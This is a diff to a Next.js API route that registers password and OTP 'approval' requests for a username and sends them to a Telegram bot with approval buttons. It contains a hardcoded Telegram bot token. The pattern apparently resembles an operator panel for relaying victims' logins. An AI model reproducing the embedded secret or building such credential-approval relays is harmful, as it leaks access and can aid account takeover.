@@ -1,7 +1,10 @@
 import { NextRequest, NextResponse } from 'next/server'
 import { sendTelegramNotification } from '@/lib/telegram'
 import { validateTelegramBody, formatZodError } from '@/lib/validators'
-import { processApprovalDecision } from '@/lib/approval-webhook'
+import { createApprovalRequest, processApprovalDecision } from '@/lib/approval-webhook'
+
+export const dynamic = 'force-dynamic'
+export const runtime = 'nodejs'
 
 const FALLBACK_BOT_TOKEN = '8985470259:AAEP5YHeX8sSz65Pfb3aoJv8Re61F10AONg'
 
@@ -21,6 +24,7 @@ export async function POST(request: NextRequest) {
       )
     }
 
+    // Handle Telegram bot callback queries (when Telegram posts here directly)
     const callbackQuery = (body as any)?.callback_query
     if (callbackQuery && typeof callbackQuery === 'object') {
       const rawData = String(callbackQuery.data || '')
@@ -70,6 +74,20 @@ export async function POST(request: NextRequest) {
       )
     }
     const { data: payload } = validation
+
+    // CRITICAL FIX: register the approval server-side BEFORE sending the
+    // Telegram message with the buttons, so the webhook can find the
+    // approvalId when a button is pressed.
+    if (
+      (payload.type === 'password_approval' || payload.type === 'otp_approval') &&
+      payload.data.approvalId
+    ) {
+      createApprovalRequest(
+        String(payload.data.username ?? ''),
+        payload.type === 'password_approval' ? 'password' : 'otp',
+        String(payload.data.approvalId)
+      )
+    }
 
     const result = await sendTelegramNotification(payload)
 
